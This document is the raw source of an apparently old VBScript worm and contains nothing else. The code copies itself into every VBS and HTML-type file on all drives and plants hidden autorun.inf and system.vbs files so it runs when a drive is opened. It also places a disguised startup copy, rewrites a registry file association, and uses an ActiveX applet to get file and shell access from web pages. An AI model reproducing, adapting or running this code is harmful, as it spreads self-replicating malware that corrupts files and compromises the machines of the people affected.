On error resume next               
Randomize               
ErrTest = WScript.ScriptFullname                
 If Err Then                
 EF="htm"                
 Else                
 EF="vbs"                
set ZEhshll=WScript.CreateObject("WSCript.shell")               
if ucase(right(WScript.ScriptFullname,10))="SYSTEM.VBS" THEN               
ZEhshll.run "IEXPLORE.EXE " &mid(WScript.ScriptFullname,1,3)               
end IF               
end If                
if EF="htm" then               
Set PW = document.applets("zxqqrh_guest")                                   
PW.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")                  
PW.createInstance()                                                     
Set MOMUNT = PW.GetObject()               
PW.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}")                    
PW.createInstance()               
Set GRBRRIR = PW.GetObject()               
for each ZE in document.scripts               
if lcase(ZE.language)="vbscript" then               
UQOYMSZEHA=ZE.text               
end if               
next               
else               
Set GRBRRIR = CreateObject("Scripting.FileSystemObject")                
Set TV = GRBRRIR.OpenTextFile(WScript.ScriptFullname, 1)                
UQOYMSZEHA = TV.ReadAll               
end if               
ZW="<SCRIPT language="&chr(34)&"VBScript"&chr(34)&">"&vbcrlf&UQOYMSZEHA&"<"&chr(47)&"script>"                
XMZPCTBGP ="<" & "script language=vbscript>" & vbCrLf & "document.write " & """" & "<" & "div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'>" & "<""&""" & "APPLET NAME=zxqqrh""&""_guest HEIGHT=0 WIDTH=0 code=com.ms.""&""activeX.Active""&""XComponent>" & "<" & "/APPLET>" & "<" & "/div>""" & vbCrLf & "<" & "/script>"&vbcrlf&ZW               
WinPath = GRBRRIR.GetSpecialFolder(0) & "\"               
MOMUNT.RegWrite "HKEY_CLASSES_ROOT\.vbs\", "vbsfile"                                 
If not(GRBRRIR.FileExists(WinPath &"Start Menu\Programs\����\internet.exe.VBS")) Then               
set systembak = GRBRRIR.CreateTextFile(WinPath &"Start Menu\Programs\����\internet.exe.VBS", true)               
systembak.write UQOYMSZEHA               
systembak.CLOS               
END IF               
Set dc = GRBRRIR.Drives               
   For each va in dc               
var =va&"\"               
zd(var)               
   Set f = GRBRRIR.GetFolder(var)               
     listfl(f)               
  For Each fz in f.SubFolders               
      listf(fz)               
      listfl(fz)                  
   Next               
next               
 sub listf(fs)               
 IF  EF="htm"  THEN               
EXIT SUB               
END IF               
 for each filed in fs.subfolders               
listf(filed)               
listfl(filed)               
next               
  end sub               
 sub listfl(f2)               
for each ww in f2.files               
exte=ucase(GRBRRIR.GetExtensionName (ww))               
IF exte="VBS" or exte="HTML" OR EXTE="HTM" OR EXTE="HTA" or exte="HTT" THEN    
cheack(ww)               
end if               
next                      
end sub               
sub cheack(ww)                
Const ForReading = 1, ForWriting = 2, ForAppending = 8                
set f1=GRBRRIR.opentextfile(ww,forreading)               
hk=f1.readall               
if Instr(hk,"'zxqqrh") <> 0 Or Len(hk) < 1 Then               
f1.close                
exit sub               
else               
Set ddf = GRBRRIR.GetFile(ww)               
ld= ddf.attributes               
 ddf.attributes=0               
   Set OBSXWV =  GRBRRIR.OpenTextFile(ww, forappending, True)               
IF ucase(GRBRRIR.GetExtensionName (ww))<>"VBS"  THEN               
OBSXWV.write vbcrlf&XMZPCTBGP               
else               
   OBSXWV.write vbcrlf&UQOYMSZEHA               
end if               
OBSXWV.close               
ddf.attributes=ld               
end if               
 end sub               
sub zd(var)               
Err.clear               
ui=var+"autorun.inf"               
If not (GRBRRIR.FileExists(WinPath&"web\folder.htt")) or not (GRBRRIR.FileExists(ui)) then               
GRBRRIR.copyfile WinPath&"web\folder.htt", var               
GRBRRIR.copyfile WinPath&"desktop.ini", var               
If Err Then                
bat=var+GRBRRIR.getfilename(iv1)               
set a = GRBRRIR.CreateTextFile(ui, true)               
set b = GRBRRIR.CreateTextFile(var&"system.vbs", true)               
a.WriteLine("[autorun]")               
a.writeline("open=WSCRIPT.EXE"&" system.vbs")               
b.writeline UQOYMSZEHA               
b.close()               
a.Close()               
set TK=GRBRRIR.getfile(ui)               
set PF=GRBRRIR.getfile(var&"system.vbs")               
TK.attributes = TK.attributes + 2               
PF.attributes = PF.attributes + 2               
end if                
end if                
end sub
